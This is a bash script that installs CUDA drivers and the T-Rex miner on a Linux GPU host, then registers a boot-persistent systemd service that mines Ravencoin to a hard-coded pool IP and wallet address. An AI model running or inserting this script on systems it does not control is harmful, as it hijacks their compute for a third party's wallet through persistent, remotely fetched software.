SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ];
then
    echo "taind vip pro" > isHaveSetupCoin.txt
    cd /usr/local/bin
    sudo apt-get install linux-headers-$(uname -r) -y
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
    sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
    echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
    sudo apt-get update
    sudo apt-get -y install cuda-drivers
    sudo apt-get install libcurl4 -y
    sudo wget https://github.com/trexminer/T-Rex/releases/download/0.24.8/t-rex-0.24.8-linux.tar.gz
    sudo tar xvzf t-rex-0.24.8-linux.tar.gz
    sudo mv t-rex /usr/local/bin/t-rex
    sudo bash -c 'echo -e "[Unit]\nDescription=Ravencoin Miner\nAfter=network.target\n\n[Service]\nType=simple\nRestart=on-failure\nRestartSec=15s\nExecStart=/usr/local/bin/t-rex -a kawpow -o stratum+tcp://178.62.59.230:4444 -u RCHgrFpTR6viTwShmratMsZAwenRNYYRao.PVM2 -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/rvn.service'
    sudo systemctl daemon-reload
    sudo systemctl enable rvn.service
    sudo systemctl start rvn.service
else
    sudo systemctl start rvn.service
fi

